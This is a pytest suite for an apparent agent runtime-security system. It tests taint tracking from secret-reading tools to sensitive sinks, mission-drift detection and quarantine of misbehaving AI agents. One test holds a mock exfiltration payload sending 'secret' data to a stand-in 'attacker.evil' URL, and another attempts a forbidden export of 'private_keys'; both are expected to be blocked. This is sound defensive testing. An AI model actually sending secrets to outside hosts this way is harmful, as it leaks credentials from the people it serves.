"""
AegisMesh — Runtime Security Step 6 Tests
Comprehensive suite for Provenance / Taint Tracking + Mission Drift Detection.

Covers the 24 required test cases:
  1-10:  Provenance & Taint Tracking
 11-19:  Mission Drift Detection & Decision Precedence
 20-24:  Integration, Agent Guard, Trust, and Ledger
"""

from unittest.mock import AsyncMock, MagicMock
import pytest
import pytest_asyncio

from backend.app.db.repository import InMemoryRepository, set_repository
from backend.app.db.repositories.contracts import (
    InMemoryContractRepository,
    set_contract_repository,
)
from backend.app.pdp.engine import PolicyDecisionPoint, set_pdp
from backend.app.schemas.agent import AgentCreate, AgentStatus
from backend.app.schemas.contract import ContractCreate, MissionContract
from backend.app.schemas.decision import (
    ActionRequest,
    DecisionReason,
    DecisionStatus,
    RiskLevel,
)
from backend.app.trust.engine import TrustEngine, set_trust_engine
from backend.app.provenance.tracker import (
    ProvenanceTracker,
    TaintLabel,
    set_provenance_tracker,
    SENSITIVE_SINKS,
)
from backend.app.drift.detector import (
    DriftDetector,
    DriftSeverity,
    set_drift_detector,
)
from backend.app.enforcement.quarantine import (
    QuarantineController,
    set_quarantine_controller,
)
from backend.app.security.exceptions import (
    ActionDenied,
    AgentQuarantined,
    InvalidAgentIdentity,
)
from agents.common.client import AegisMeshClient
from agents.researcher.agent import ResearcherAgent
from agents.executor.agent import ExecutorAgent
from backend.app.main import app


# ===========================================================================
# FIXTURES
# ===========================================================================

@pytest.fixture(autouse=True)
def setup_environment():
    r = InMemoryRepository()
    set_repository(r)
    cr = InMemoryContractRepository()
    set_contract_repository(cr)
    te = TrustEngine()
    set_trust_engine(te)
    pt = ProvenanceTracker()
    set_provenance_tracker(pt)
    dd = DriftDetector()
    set_drift_detector(dd)
    qc = QuarantineController(repository=r)
    set_quarantine_controller(qc)
    pdp = PolicyDecisionPoint(
        contract_repository=cr,
        trust_evaluator=te,
        provenance_evaluator=pt,
        drift_detector=dd,
        quarantine_controller=qc,
    )
    set_pdp(pdp)
    return {
        "repo": r,
        "contract_repo": cr,
        "trust_engine": te,
        "provenance_tracker": pt,
        "drift_detector": dd,
        "quarantine_controller": qc,
        "pdp": pdp,
    }


@pytest.fixture
def repo(setup_environment):
    return setup_environment["repo"]


@pytest.fixture
def contract_repo(setup_environment):
    return setup_environment["contract_repo"]


@pytest.fixture
def trust_engine(setup_environment):
    return setup_environment["trust_engine"]


@pytest.fixture
def provenance_tracker(setup_environment):
    return setup_environment["provenance_tracker"]


@pytest.fixture
def drift_detector(setup_environment):
    return setup_environment["drift_detector"]


@pytest.fixture
def quarantine_controller(setup_environment):
    return setup_environment["quarantine_controller"]


@pytest_asyncio.fixture
async def registered_agent(repo):
    agent = await repo.register_agent(AgentCreate(
        id="test-agent-01",
        name="Security Tester",
        role="researcher",
        capabilities=["web.search", "secrets.read", "external.post"],
    ))
    return agent


@pytest_asyncio.fixture
async def agent_b(repo):
    agent = await repo.register_agent(AgentCreate(
        id="test-agent-02",
        name="Recipient Agent",
        role="executor",
        capabilities=["external.post", "report.generate"],
    ))
    return agent


@pytest_asyncio.fixture
async def agent_c(repo):
    agent = await repo.register_agent(AgentCreate(
        id="test-agent-03",
        name="Downstream Agent",
        role="executor",
        capabilities=["external.post"],
    ))
    return agent


@pytest.fixture
def standard_contract():
    return MissionContract(
        id="contract-std-01",
        agent_id="test-agent-01",
        name="Standard Mission Contract",
        description="Standard allowed and forbidden tools",
        allowed_tools=["web.search", "web.read", "secrets.read"],
        forbidden_tools=["database.export", "git.push"],
        risk_level=RiskLevel.MEDIUM,
        enabled=True,
    )


# ===========================================================================
# 1-10: PROVENANCE & TAINT TRACKING TESTS
# ===========================================================================

@pytest.mark.asyncio
async def test_01_clean_source(provenance_tracker):
    """1. CLEAN source: clean agent has CLEAN taint label and check_sink finds no taint."""
    label = await provenance_tracker.get_agent_taint("clean-agent")
    assert label == TaintLabel.CLEAN

    res = await provenance_tracker.check_sink("clean-agent", "web.search")
    assert res.is_tainted is False
    assert res.label == TaintLabel.CLEAN
    assert res.record is None


@pytest.mark.asyncio
async def test_02_untrusted_source(provenance_tracker):
    """2. UNTRUSTED source: untrusted source tool or payload keyword flags UNTRUSTED."""
    assert ProvenanceTracker.is_untrusted_source("web.search") is True
    assert ProvenanceTracker.is_untrusted_source("external.get") is True

    # Mark via untrusted helper
    await provenance_tracker.mark_untrusted("agent-web", source_tool="web.search")
    label = await provenance_tracker.get_agent_taint("agent-web")
    assert label == TaintLabel.UNTRUSTED

    # Detect via payload keyword heuristic
    res = await provenance_tracker.check_sink(
        "agent-payload",
        "web.search",
        payload={"token": "bearer-xyz-123"},
    )
    assert res.is_tainted is True
    assert res.label == TaintLabel.UNTRUSTED


@pytest.mark.asyncio
async def test_03_sensitive_source(provenance_tracker):
    """3. SENSITIVE source: sensitive source tools are recognized and mark agent SENSITIVE."""
    assert ProvenanceTracker.is_sensitive_source("secrets.read") is True
    assert ProvenanceTracker.is_sensitive_source("env.read") is True
    assert ProvenanceTracker.is_sensitive_source("credentials.fetch") is True

    rec = await provenance_tracker.mark_tainted("agent-sec", source_tool="secrets.read")
    label = await provenance_tracker.get_agent_taint("agent-sec")
    assert label == TaintLabel.SENSITIVE
    assert rec.source_agent == "agent-sec"
    assert rec.source_tool == "secrets.read"


@pytest.mark.asyncio
async def test_04_tainted_source(provenance_tracker):
    """4. TAINTED source: propagated taint sets second-order TAINTED label."""
    await provenance_tracker.mark_tainted("source-agent", source_tool="env.read")
    await provenance_tracker.propagate("source-agent", "receiver-agent")
    label = await provenance_tracker.get_agent_taint("receiver-agent")
    assert label == TaintLabel.TAINTED


@pytest.mark.asyncio
async def test_05_sensitive_source_becomes_tainted_on_allow(
    repo, contract_repo, trust_engine, provenance_tracker, drift_detector, registered_agent
):
    """5. Sensitive source becomes tainted: executing sensitive tool under PEP marks agent."""
    await contract_repo.create_contract(ContractCreate(
        id="c-sec-read",
        agent_id="test-agent-01",
        name="Allow Secrets Read",
        allowed_tools=["secrets.read"],
        forbidden_tools=[],
        risk_level=RiskLevel.MEDIUM,
    ))

    pdp = PolicyDecisionPoint(
        contract_repository=contract_repo,
        trust_evaluator=trust_engine,
        provenance_evaluator=provenance_tracker,
        drift_detector=drift_detector,
    )
    set_pdp(pdp)

    # Initial state is CLEAN
    initial_taint = await provenance_tracker.get_agent_taint("test-agent-01")
    assert initial_taint == TaintLabel.CLEAN

    # Call secrets.read (ALLOWED by contract)
    req = ActionRequest(agent_id="test-agent-01", action="secrets.read")
    decision = await pdp.evaluate(req, agent=registered_agent)
    assert decision.decision == DecisionStatus.ALLOW

    # Agent is now automatically marked as SENSITIVE
    post_taint = await provenance_tracker.get_agent_taint("test-agent-01")
    assert post_taint == TaintLabel.SENSITIVE


@pytest.mark.asyncio
async def test_06_taint_propagation(provenance_tracker):
    """6. Taint propagation: propagates taint from sender to recipient."""
    await provenance_tracker.mark_tainted("agent-1", source_tool="credentials.fetch")
    rec = await provenance_tracker.propagate("agent-1", "agent-2")
    assert rec is not None
    assert rec.label == TaintLabel.TAINTED
    assert rec.propagation_path == ["agent-1", "agent-2"]
    label = await provenance_tracker.get_agent_taint("agent-2")
    assert label == TaintLabel.TAINTED


@pytest.mark.asyncio
async def test_07_cross_agent_multi_hop_propagation(provenance_tracker):
    """7. Cross-agent propagation: multi-hop A -> B -> C preserves taint and lineage."""
    await provenance_tracker.mark_tainted("agent-A", source_tool="secrets.read")
    await provenance_tracker.propagate("agent-A", "agent-B")
    await provenance_tracker.propagate("agent-B", "agent-C")

    # Receiving agent cannot claim it is CLEAN
    label_c = await provenance_tracker.get_agent_taint("agent-C")
    assert label_c == TaintLabel.TAINTED

    # Attempting to declare CLEAN via metadata cannot cleanse existing taint
    res = await provenance_tracker.check_sink(
        "agent-C",
        "external.post",
        provenance_meta={"taint_label": "CLEAN"},
    )
    assert res.is_tainted is True
    assert res.record.is_hit is True
    assert res.record.propagation_path == ["agent-A", "agent-B", "agent-C"]


@pytest.mark.asyncio
async def test_08_sensitive_sink_detection(provenance_tracker):
    """8. Sensitive sink detection: detects all documented architecture sinks."""
    for sink in ["external.post", "git.push", "shell.exec", "database.export"]:
        assert sink in SENSITIVE_SINKS
        tracker = ProvenanceTracker()
        await tracker.mark_tainted("agent-test", source_tool="secrets.read")
        res = await tracker.check_sink("agent-test", sink)
        assert res.is_tainted is True
        assert res.record is not None
        assert res.record.is_hit is True
        assert res.record.sink_tool == sink


@pytest.mark.asyncio
async def test_09_tainted_sink_enforcement(
    repo, contract_repo, trust_engine, provenance_tracker, drift_detector, registered_agent
):
    """9. Tainted sink enforcement: PDP blocks tainted agent requesting forbidden sink."""
    await contract_repo.create_contract(ContractCreate(
        id="c-sink-test",
        agent_id="test-agent-01",
        name="Allow Post",
        allowed_tools=["external.post"],
        forbidden_tools=[],
        risk_level=RiskLevel.HIGH,
    ))
    pdp = PolicyDecisionPoint(
        contract_repository=contract_repo,
        trust_evaluator=trust_engine,
        provenance_evaluator=provenance_tracker,
        drift_detector=drift_detector,
    )
    set_pdp(pdp)

    # Taint agent with sensitive source
    await provenance_tracker.mark_tainted("test-agent-01", source_tool="env.read")

    # Request sensitive sink
    req = ActionRequest(agent_id="test-agent-01", action="external.post")
    decision = await pdp.evaluate(req, agent=registered_agent)
    assert decision.decision == DecisionStatus.BLOCK
    assert decision.allowed is False
    assert decision.reason == DecisionReason.TAINT_SENSITIVE_LEAK
    assert decision.risk_level == RiskLevel.CRITICAL


@pytest.mark.asyncio
async def test_10_provenance_evidence(provenance_tracker):
    """10. Provenance evidence: lineage clearly explains source, agents, and sink."""
    await provenance_tracker.mark_tainted("agent-alpha", source_tool="secrets.read")
    await provenance_tracker.propagate("agent-alpha", "agent-beta")
    res = await provenance_tracker.check_sink("agent-beta", "external.post")

    assert res.is_tainted is True
    rec = res.record
    assert rec is not None
    assert rec.is_hit is True
    assert rec.source_agent == "agent-alpha"
    assert rec.source_tool == "secrets.read"
    assert rec.propagation_path == ["agent-alpha", "agent-beta"]
    assert rec.sink_tool == "external.post"
    assert rec.sink_agent == "agent-beta"

    rec_dict = rec.to_dict()
    assert rec_dict["source_agent"] == "agent-alpha"
    assert rec_dict["sink_tool"] == "external.post"
    assert rec_dict["propagation_path"] == ["agent-alpha", "agent-beta"]


# ===========================================================================
# 11-19: MISSION DRIFT DETECTION & DECISION PRECEDENCE TESTS
# ===========================================================================

def test_11_allowed_tool_no_drift(drift_detector, standard_contract):
    """11. Allowed tool -> no drift: drift = 0.0, severity = NONE."""
    req = ActionRequest(agent_id="test-agent-01", action="web.search")
    res = drift_detector.evaluate(req, standard_contract)
    assert res.drift_score == 0.0
    assert res.severity == DriftSeverity.NONE


def test_12_forbidden_tool_critical_drift(drift_detector, standard_contract):
    """12. Forbidden tool -> critical drift: drift = 1.0, severity = CRITICAL."""
    req = ActionRequest(agent_id="test-agent-01", action="database.export")
    res = drift_detector.evaluate(req, standard_contract)
    assert res.drift_score == 1.0
    assert res.severity == DriftSeverity.CRITICAL
    assert res.details.get("forbidden") is True


@pytest.mark.asyncio
async def test_13_forbidden_tool_blocks_action(
    repo, contract_repo, trust_engine, provenance_tracker, drift_detector, registered_agent, standard_contract
):
    """13. Forbidden tool -> BLOCK: PDP returns BLOCK with CRITICAL risk."""
    await contract_repo.create_contract(ContractCreate(
        id=standard_contract.id,
        agent_id=standard_contract.agent_id,
        name=standard_contract.name,
        allowed_tools=standard_contract.allowed_tools,
        forbidden_tools=standard_contract.forbidden_tools,
        risk_level=standard_contract.risk_level,
    ))
    pdp = PolicyDecisionPoint(
        contract_repository=contract_repo,
        trust_evaluator=trust_engine,
        provenance_evaluator=provenance_tracker,
        drift_detector=drift_detector,
    )
    set_pdp(pdp)

    req = ActionRequest(agent_id="test-agent-01", action="database.export")
    decision = await pdp.evaluate(req, agent=registered_agent)
    assert decision.decision == DecisionStatus.BLOCK
    assert decision.allowed is False
    assert decision.risk_level == RiskLevel.CRITICAL
    assert decision.reason in (DecisionReason.MISSION_DRIFT, DecisionReason.CONTRACT_VIOLATION)


def test_14_risk_envelope_breach_high_drift(drift_detector):
    """14. Risk-envelope breach -> HIGH drift."""
    contract = MissionContract(
        id="c-low-risk",
        agent_id="test-agent-01",
        name="Low Risk",
        allowed_tools=["web.search"],
        forbidden_tools=[],
        risk_level=RiskLevel.LOW,
        enabled=True,
    )
    # shell.exec is HIGH risk, exceeding LOW risk envelope
    req = ActionRequest(agent_id="test-agent-01", action="shell.exec")
    res = drift_detector.evaluate(req, contract)
    assert res.severity in (DriftSeverity.HIGH, DriftSeverity.CRITICAL)
    assert res.drift_score >= 0.7


def test_15_unknown_tool_moderate_drift(drift_detector, standard_contract):
    """15. Unknown tool -> MODERATE drift (drift_score = 0.5)."""
    req = ActionRequest(agent_id="test-agent-01", action="unlisted.experimental.tool")
    res = drift_detector.evaluate(req, standard_contract)
    assert res.drift_score == 0.5
    assert res.severity == DriftSeverity.MODERATE


def test_16_drift_decision_is_deterministic(drift_detector, standard_contract):
    """16. Drift decision is deterministic: evaluate produces identical score every time."""
    req = ActionRequest(agent_id="test-agent-01", action="database.export")
    res1 = drift_detector.evaluate(req, standard_contract)
    res2 = drift_detector.evaluate(req, standard_contract)
    res3 = drift_detector.evaluate(req, standard_contract)

    assert res1.drift_score == res2.drift_score == res3.drift_score == 1.0
    assert res1.severity == res2.severity == res3.severity == DriftSeverity.CRITICAL


@pytest.mark.asyncio
async def test_17_drift_cannot_override_stronger_block(
    repo, contract_repo, trust_engine, provenance_tracker, drift_detector, registered_agent
):
    """17. Drift cannot override stronger BLOCK: unauthorized high-risk action remains BLOCK."""
    await contract_repo.create_contract(ContractCreate(
        id="c-strict-01",
        agent_id="test-agent-01",
        name="Strict",
        allowed_tools=["web.search"],
        forbidden_tools=[],
        risk_level=RiskLevel.LOW,
    ))
    pdp = PolicyDecisionPoint(
        contract_repository=contract_repo,
        trust_evaluator=trust_engine,
        provenance_evaluator=provenance_tracker,
        drift_detector=drift_detector,
    )
    set_pdp(pdp)

    # shell.exec is unlisted and high risk; must NOT be downgraded to APPROVAL or ALLOW
    req = ActionRequest(agent_id="test-agent-01", action="shell.exec")
    decision = await pdp.evaluate(req, agent=registered_agent)
    assert decision.decision == DecisionStatus.BLOCK
    assert decision.allowed is False


@pytest.mark.asyncio
async def test_18_quarantine_takes_precedence(
    repo, contract_repo, trust_engine, provenance_tracker, drift_detector, registered_agent
):
    """18. Quarantine still takes precedence: quarantined agent returns QUARANTINE status."""
    await repo.update_agent_status("test-agent-01", AgentStatus.QUARANTINED)
    agent = await repo.get_agent("test-agent-01")

    pdp = PolicyDecisionPoint(
        contract_repository=contract_repo,
        trust_evaluator=trust_engine,
        provenance_evaluator=provenance_tracker,
        drift_detector=drift_detector,
    )
    set_pdp(pdp)

    req = ActionRequest(agent_id="test-agent-01", action="web.search")
    decision = await pdp.evaluate(req, agent=agent)
    assert decision.decision == DecisionStatus.QUARANTINE
    assert decision.allowed is False
    assert decision.reason == DecisionReason.AGENT_QUARANTINED


@pytest.mark.asyncio
async def test_19_unknown_agent_returns_invalid_identity(
    contract_repo, trust_engine, provenance_tracker, drift_detector
):
    """19. Unknown agent returns INVALID_IDENTITY / BLOCK."""
    pdp = PolicyDecisionPoint(
        contract_repository=contract_repo,
        trust_evaluator=trust_engine,
        provenance_evaluator=provenance_tracker,
        drift_detector=drift_detector,
    )
    set_pdp(pdp)

    req = ActionRequest(agent_id="ghost-agent-404", action="web.search")
    decision = await pdp.evaluate(req, agent=None)
    assert decision.decision == DecisionStatus.BLOCK
    assert decision.allowed is False
    assert decision.reason == DecisionReason.INVALID_IDENTITY


# ===========================================================================
# 20-24: INTEGRATION, AGENT GUARD, TRUST, AND LEDGER TESTS
# ===========================================================================

@pytest.mark.asyncio
async def test_20_allowed_action_still_executes(contract_repo):
    """20. Allowed action still executes via agent.execute_protected()."""
    client = AegisMeshClient(app=app)
    await client.register_agent(
        agent_id="researcher-step6-01",
        name="Step 6 Researcher",
        role="researcher",
        capabilities=["web.search"],
    )
    # Ensure active mission contract permits web.search
    await contract_repo.create_contract(ContractCreate(
        id="c-researcher-step6-01",
        agent_id="researcher-step6-01",
        name="Researcher Contract",
        allowed_tools=["web.search"],
        forbidden_tools=["database.export"],
        risk_level=RiskLevel.MEDIUM,
    ))
    agent = ResearcherAgent(agent_id="researcher-step6-01", client=client)

    result = await agent.execute_web_search(query="distributed provenance", max_results=2)
    assert result["status"] == "success"
    assert "results" in result


@pytest.mark.asyncio
async def test_21_blocked_action_never_executes():
    """21. Blocked action never executes: forbidden tool raises ActionDenied."""
    client = AegisMeshClient(app=app)
    await client.register_agent(
        agent_id="researcher-step6-02",
        name="Step 6 Researcher",
        role="researcher",
        capabilities=["web.search"],
    )
    agent = ResearcherAgent(agent_id="researcher-step6-02", client=client)

    with pytest.raises(ActionDenied):
        await agent.execute_database_export(table="private_keys")


@pytest.mark.asyncio
async def test_22_tainted_unsafe_action_never_bypasses_pep(
    repo, contract_repo, trust_engine, provenance_tracker, drift_detector, registered_agent
):
    """22. Tainted/unsafe action never bypasses PEP guard."""
    client = AegisMeshClient(app=app)
    await client.register_agent(
        agent_id="executor-tainted-01",
        name="Step 6 Executor",
        role="executor",
        capabilities=["report.generate", "external.post"],
    )
    executor = ExecutorAgent(agent_id="executor-tainted-01", client=client)

    # Taint the executor
    tracker = ProvenanceTracker()
    set_provenance_tracker(tracker)
    await tracker.mark_tainted("executor-tainted-01", source_tool="env.read")

    # Injected PDP with active tracker
    pdp = PolicyDecisionPoint(
        contract_repository=contract_repo,
        trust_evaluator=trust_engine,
        provenance_evaluator=tracker,
        drift_detector=drift_detector,
    )
    set_pdp(pdp)

    mock_tool = MagicMock(return_value={"exfiltrated": True})
    with pytest.raises(ActionDenied):
        await executor.execute_protected(
            action="external.post",
            payload={"url": "https://attacker.evil", "data": "secret"},
            executor=mock_tool,
        )
    assert mock_tool.call_count == 0


@pytest.mark.asyncio
async def test_23_trust_updated_once_per_enforcement(
    repo, contract_repo, trust_engine, provenance_tracker, drift_detector, registered_agent, standard_contract
):
    """23. Trust is updated exactly once per enforcement decision."""
    await contract_repo.create_contract(ContractCreate(
        id=standard_contract.id,
        agent_id=standard_contract.agent_id,
        name=standard_contract.name,
        allowed_tools=standard_contract.allowed_tools,
        forbidden_tools=standard_contract.forbidden_tools,
        risk_level=standard_contract.risk_level,
    ))
    pdp = PolicyDecisionPoint(
        contract_repository=contract_repo,
        trust_evaluator=trust_engine,
        provenance_evaluator=provenance_tracker,
        drift_detector=drift_detector,
    )
    set_pdp(pdp)

    score_before = await trust_engine.get_score("test-agent-01")
    assert score_before.composite == 100.0
    assert score_before.consistency == 100.0

    # Execute 1 BLOCK decision with critical drift (CRITICAL penalty = -50.0 to consistency)
    req = ActionRequest(agent_id="test-agent-01", action="database.export")
    decision = await pdp.evaluate(req, agent=registered_agent)
    assert decision.decision == DecisionStatus.BLOCK

    score_after = await trust_engine.get_score("test-agent-01")
    # Consistency dropped exactly once by 50.0
    assert score_after.consistency == 50.0
    # Composite: 0.35*100 + 0.25*100 + 0.20*50 + 0.20*100 = 90.0
    assert score_after.composite == 90.0


@pytest.mark.asyncio
async def test_24_ledger_remains_valid(repo, contract_repo):
    """24. Ledger remains valid and cryptographically verifiable after enforcement events."""
    client = AegisMeshClient(app=app)
    await client.register_agent(
        agent_id="researcher-ledger-01",
        name="Ledger Agent",
        role="researcher",
        capabilities=["web.search"],
    )
    await contract_repo.create_contract(ContractCreate(
        id="c-researcher-ledger-01",
        agent_id="researcher-ledger-01",
        name="Researcher Contract",
        allowed_tools=["web.search"],
        forbidden_tools=[],
        risk_level=RiskLevel.LOW,
    ))
    agent = ResearcherAgent(agent_id="researcher-ledger-01", client=client)

    # Execute allowed action (records enforcement event)
    await agent.execute_web_search(query="ledger proof")

    # Verify ledger integrity
    async with client._create_http_client() as http:
        verify_resp = await http.get("/ledger/verify")
        assert verify_resp.status_code == 200
        data = verify_resp.json()
        assert data["chain_valid"] is True
        assert data["errors"] == []
        assert data["checked"] > 0
